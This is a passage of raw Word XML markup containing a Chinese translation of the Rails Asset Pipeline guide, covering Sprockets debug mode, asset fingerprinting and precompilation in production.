          </w:tcPr>
          <w:p w14:paraId="0625DDE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 core</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75BFC36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 projects</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58B865B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require tickets</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1A73CB1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会生成如下 HTML:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6000"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="0B3E23B0" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6742ACA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&lt;script</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>src="/assets/core.js?body=1"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03E5B20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&lt;script</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>src="/assets/projects.js?body=1"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DEC3F1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&lt;script</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>src="/assets/tickets.js?body=1"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="69EBDCD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Sprockets 需要 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>body</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1884365E"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3.1 关闭调试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23267D3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你可以通过如下更新 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/enviorments/development.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>文件以关闭调式模式:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="49142A02" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="169E118E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1232697094"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>config.assets.debug = false</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="259C7C2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当调试模式关闭后，Sprockets 对所有的文件进行必要的预处理和连结。随着调试模式的关闭，相对与上面 manifest会生成:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="1DCEA930" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F529297" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="909578503"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;script</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>src="/assets/application.js"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1C3D538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在服务器启动后，资源在第一次请求时被编译并缓存。Sprockets 设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>must-revalidate</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Cache-Control 的 HTTP 头部去防止在后续的请求开销 — 浏览器会获得一个 304 (Not Modified) 的回应。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B9571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如果在各请求之间，任何在资源清单里的文件发生了变更，服务器会返回一个重新编译的文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C50499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调试模式也可以通过 Rails 的 helper 方法开启：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="4CD5188D" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4F24973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stylesheet_link_tag "application", :debug</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</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49C95BD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javascript_include_tag "application", :debug</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; true</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261BC41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如果调试模式已经开启，</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:debug</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项则是多余的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="123DC12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你可能会在开发模式中开启压缩以作一个完整性检查，或者可以在需要调试时按需关闭。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6626D99D"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4 在生产中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7758F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在生产环境中，Rails 使用上面提到过的指纹识别方案。默认情况下，Rails 认为资源已经预编译过并且将会由 web 服务器以静态资源供应。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9BE78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在预编译阶段，MD5 是从已编译的内容生成的，然后在文件写入到磁盘时插入到文件名中。这些指纹识别过的名字都被用于 Rails helpers 替代资源清单的名字。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740DCEB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例如这个:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="161A05BE" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50C0A79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javascript_include_tag "application"</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09EAF73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stylesheet_link_tag "application"</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7F5B15E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生成像这样的东西：</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0CAE5135" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6464FF0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&lt;script</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>src="/assets/application-908e25f4bf641868d8683022a5b62f54.js"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1197EEB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&lt;link</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>href="/assets/application-4dd5b109ee3439da54f5bdfd78a80473.css"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>media="screen"</w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>rel="stylesheet"</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166E067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这个指纹识别动作是由 Rails 的 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.digest</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置控制的 (默认除了在生产环境中为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 外，其它环境都为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15FBD80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一般情况下默认选项不应该被改变。如果文件名里没有摘要(译者注:digests)，而且 far-futrue 头部也没有设置的话，远程客户端永远都不会在它们的内容变更时去刷新它们。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799A7C18"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4.1 预编译资源</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3697ADD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Rails 本身绑定了一个 rake 任何去编译资源资源清单和 pipeline 中的其它文件到磁盘里。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73F4D42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编译后的资源都被写入到了在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.prefix</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 指定的位置里。默认情况下，是 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>pulibc/assets</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 目录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127C3EE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在开发期间你可以在服务器调用这个任务以直接在服务器上生成已编译版本的资源文件。 如果你对生产环境的文件系统没有写入权限， 你可以在本地调用这个任务然后部署编译好的资源。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4385F04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这个 rake 任何是:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w14:paraId="5A9C8FE0" w14:textId="77777777" w:rsidTr="004E5E0B">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="045F646E" w14:textId="77777777" w:rsidR="004E5E0B" w:rsidRPr="004E5E0B" w:rsidRDefault="004E5E0B" w:rsidP="004E5E0B">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1717698561"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004E5E0B">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>bundle exec rake assets:precompile</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="43485BE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为了更快速的预编译资源，你可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里将 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.initialize_on_precompile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 去部分加载你的应用程序。虽然这么做模板会看不到应用程序对象和方法。 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Heroku 要求这个为 false.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FA19A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如果你设置 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.assets.initialize_on_precomile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 false, 在部署之前确保在本地测试 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake assets:precompile</w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. 这应该会因为你的资源引用了应用程序对象或者方法而报错, 因为在开发模式范围内会忽略这个标记的值. 改变这个标记也会影响到 engines. Engines 也可以指定预编译资源. 因为完整的环境还没有加载完, engines (或者其他的 gems) 将不会被加载, 这会引起资源丢失.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB74E7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Capistrano (v2.8.0 或以上) 包含了一个处理这个情况的方法. 把下面这行加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="004E5E0B">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
